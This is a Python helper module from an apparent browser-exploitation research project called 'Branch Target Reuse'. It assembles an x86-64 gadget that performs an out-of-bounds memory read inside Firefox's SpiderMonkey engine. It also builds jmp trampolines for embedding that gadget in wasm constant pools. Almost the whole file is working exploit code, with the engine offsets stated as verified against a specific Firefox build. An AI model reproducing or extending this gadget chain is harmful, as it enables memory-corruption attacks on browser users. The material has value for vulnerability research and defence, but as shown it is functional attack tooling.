#!/usr/bin/env python3

# Branch Target Reuse (BTR)
# April 30th 2026
# Yuhui Zhu

# x86-64 arch strategy for make_target_wasm.py: assemble machine code, build the
# ArrayBuffer OOB-read gadget, and emit the `jmp rel32` trampoline. Turning the
# resulting bytes into f64/v128 pool literals is arch-independent and lives in
# make_target_wasm.py.
#
# Library only: make_target_wasm.py imports `assemble` / `build_gadget` /
# `trampoline` / `NOP` from here.

import os
import struct
import subprocess
import tempfile

# x86 NOP, used to pad a gadget's final pool slot (the padding is never executed:
# the last real instruction has already run, or a trampoline jumps over it).
NOP = b'\x90'

# `jmp rel32` = opcode 0xE9 plus a 4-byte signed displacement, 5 bytes total.
# x86 measures a relative displacement from the NEXT instruction (RIP already
# points past the jmp when it executes), so a trampoline's displacement is taken
# from its slot offset plus this length. It is also how much of the slot the
# branch occupies, so the rest is NOP padding.
JMP_REL32 = b'\xE9'
JMP_REL32_LEN = 5


def assemble(asm_code: str) -> bytes:
    """Assemble Intel/NASM-syntax x86-64 to raw bytes (nasm -f bin, BITS 64)."""
    with tempfile.TemporaryDirectory() as tmpdir:
        asm_file = os.path.join(tmpdir, 'input.asm')
        bin_file = os.path.join(tmpdir, 'output.bin')
        with open(asm_file, 'w') as f:
            f.write('BITS 64\n' + asm_code)
        r = subprocess.run(['nasm', '-f', 'bin', '-o', bin_file, asm_file],
                           capture_output=True, text=True)
        if r.returncode != 0:
            raise RuntimeError(r.stderr.strip())
        with open(bin_file, 'rb') as f:
            return f.read()


def build_gadget() -> str:
    """ArrayBuffer OOB-read gadget (NASM asm). At the trainer call site in the
    current demo.js, the args land at fixed stack slots: rsp+0x20 -> arg0,
    rsp+0x28 -> arg1, rsp+0x30 -> arg2 (nothing else is guaranteed). The gadget
    unboxes arg0, follows the view's data pointer, and does the out-of-bounds load:
      reg0 = *(Value*)(rsp+0x20)         ; arg0: boxed Uint8Array Value
      reg0 ^= 0xFFFE000000000000         ; strip NaN-box tag -> object pointer
      reg1 = *(void**)(reg0 + 0x30)      ; ArrayBufferViewObject DATA_SLOT
      reg2 = *(int32_t*)(rsp+0x30)       ; arg2: int32 offset
      reg3 = *(uint64_t*)(reg1 + reg2)   ; the OOB read
    (reg0..reg3 = rax,rbx,rcx,rdx). DATA_SLOT is fixed slot 3 of the view object
    (js/src/vm/ArrayBufferViewObject.h:48), i.e. +0x30. Stack slots, that offset,
    and the tag mask verified live against Firefox 143 debug jsshell."""
    return (
        'mov rax, [rsp+0x20]       ; reg0 = arg0 (boxed Uint8Array Value)\n'
        'mov rdx, -0x2000000000000 ; rdx = NaN-box tag mask (0xFFFE000000000000)\n'
        'xor rax, rdx              ; reg0 = unboxed JSObject pointer\n'
        'mov rbx, [rax+0x30]       ; reg1 = view DATA_SLOT (data pointer)\n'
        'mov ecx, [rsp+0x30]       ; reg2 = arg2 (int32 offset)\n'
        'mov rdx, [rbx+rcx]        ; reg3 = *(reg1 + reg2) -- the OOB read\n')


def trampoline(slot: int, slot_size: int, target_slot: int = 0) -> bytes:
    """`jmp rel32` (+NOP pad to slot_size) from pool slot `slot` to the gadget at
    pool slot `target_slot`. disp = target_off - (this_slot_off + JMP_REL32_LEN);
    both offsets are pool-relative so the pool's absolute offset cancels, making
    this layout-independent."""
    disp = (target_slot - slot) * slot_size - JMP_REL32_LEN
    return (JMP_REL32 + struct.pack('<i', disp)
            + NOP * (slot_size - JMP_REL32_LEN))
